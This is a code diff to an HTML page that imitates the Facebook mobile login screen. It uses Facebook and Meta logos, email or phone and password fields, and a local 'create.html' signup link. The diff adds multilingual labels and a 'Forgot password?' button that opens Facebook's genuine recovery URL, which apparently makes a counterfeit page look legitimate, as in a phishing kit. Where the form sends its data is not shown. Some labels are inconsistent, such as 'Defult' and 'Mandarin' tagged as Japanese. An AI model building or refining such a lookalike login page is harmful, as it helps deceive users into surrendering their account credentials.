@@ -222,7 +222,7 @@
 
                 <center>
                      <h2>———<br><br> Select your language</h2></center><br>
-                <div data-lang="fr" data-lang-name=""></div>
+                <div data-lang="fr" data-lang-name="English">Defult</div>
                 <div data-lang="en" data-lang-name="English (US)">English (US)</div>
                 <div data-lang="bn" data-lang-name="Bangla">Bangla</div>
                 <div data-lang="hi" data-lang-name="Hindi">Hindi</div>
@@ -232,7 +232,7 @@
                 <div data-lang="fr" data-lang-name="French">French</div>
                 <div data-lang="ja" data-lang-name="Japanese">Japanese</div>
                
-                <div data-lang="fr" data-lang-name=""></div><br>
+                <div data-lang="fr" data-lang-name="Japanese">Mandarin</div><br>
             </div>
         </div>
         <div style="text-align: center;"><img src="https://static.vecteezy.com/system/resources/previews/018/930/476/non_2x/facebook-logo-facebook-icon-transparent-free-png.png" width="30%" alt="Facebook Logo"></div><br>
@@ -247,7 +247,8 @@
                 <i class="fas fa-eye eye-icon" id="togglePassword"></i>
             </div>
             <button type="submit" class="btn" data-i18n="Log in">Log in</button><br><br>
-            <div style="text-align: center;"><p data-i18n="Forgot password?">Forgot password?</p></div>
+            <center><p2 id="forgotPassword">Forgot password?</p2></center>
+    
         </form><br>
         <input type="button" id="createAccountBtn" value="Create new account" onclick="window.location.href='create.html';"><br><br><br><br><br><br><br><br><br><br>
         <div style="text-align: center;"><img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="20%" alt="Meta Logo"></div>
@@ -277,7 +278,62 @@
                         "Create new account": "নতুন অ্যাকাউন্ট তৈরি করুন"
                     }
                 },
-                // Add other language resources as needed
+                hi: {
+                    translation: {
+                        "Mobile number or email address": "मोबाइल नंबर या ईमेल पता",
+                        "Password": "पासवर्ड",
+                        "Log in": "लॉग इन करें",
+                        "Forgot password?": "पासवर्ड भूल गए?",
+                        "Create new account": "नया खाता बनाएँ"
+                    }
+                },
+                ar: {
+                    translation: {
+                        "Mobile number or email address": "رقم الهاتف المحمول أو عنوان البريد الإلكتروني",
+                        "Password": "كلمة المرور",
+                        "Log in": "تسجيل الدخول",
+                        "Forgot password?": "هل نسيت كلمة السر؟",
+                        "Create new account": "إنشاء حساب جديد"
+                    }
+                },
+                uk: {
+                    translation: {
+                        "Mobile number or email address": "Mobile number or email address",
+                        "Password": "Password",
+                        "Log in": "Log in",
+                        "Forgot password?": "Forgot password?",
+                        "Create new account": "Create new account"
+                    }
+                },
+                ru: {
+                    translation: {
+                        "Mobile number or email address": "Мобильный номер или адрес электронной почты",
+                        "Password": "пароль",
+                        "Log in": "Войти",
+                        "Forgot password?": "Забыли пароль?",
+                        "Create new account": "Создать новый аккаунт"
+                    }
+                },
+                fr: {
+                    translation: {
+                        "Mobile number or email address": "Numéro de mobile ou adresse e-mail",
+                        "Password": "Mot de passe",
+                        "Log in": "Connexion",
+                        "Forgot password?": "Mot de passe oublié?",
+                        "Create new account": "Créer un nouveau compte"
+                    }
+                },
+                ja: {
+                    translation: {
+                        "Mobile number or email address": "携帯番号またはメールアドレス",
+                        "Password": "パスワード",
+                        "Log in": "ログイン",
+                        "Forgot password?": "パスワードを忘れた?",
+                        "Create new account": "新しいアカウントを作成する"
+                    }
+                }
+        
+
             }
         });
 
@@ -335,6 +391,9 @@
             }
         });
 
+         document.getElementById('forgotPassword').addEventListener('click', function() {
+            window.open('https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0QHZb3SwCI7CkOvUs&ref=dbl&_rdr', '_blank');
+        });
         // Initial content update
         updateContent();
     </script>
